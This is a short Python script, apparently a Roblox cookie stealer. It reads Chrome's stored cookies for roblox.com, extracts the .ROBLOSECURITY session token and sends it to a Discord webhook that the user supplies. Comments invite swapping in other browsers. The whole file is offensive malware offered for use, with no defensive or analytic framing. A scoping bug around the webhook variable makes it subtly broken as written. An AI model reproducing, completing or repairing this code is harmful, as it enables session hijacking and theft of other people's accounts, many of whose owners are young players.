import browser_cookie3, requests, threading
from discord_webhook import DiscordWebhook

webhook = "" #Put your webhook in here

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        webhook = DiscordWebhook(url=f'{webhook}', content=f'{cookie}')
        webhook.execute()
    except Exception as e:
        print(e)

browsers = [chrome_logger] #you can change the browser to whatever you want just change it from(chrome_logger) to (****_logger)

for x in browsers:
    threading.Thread(target=x,).start()

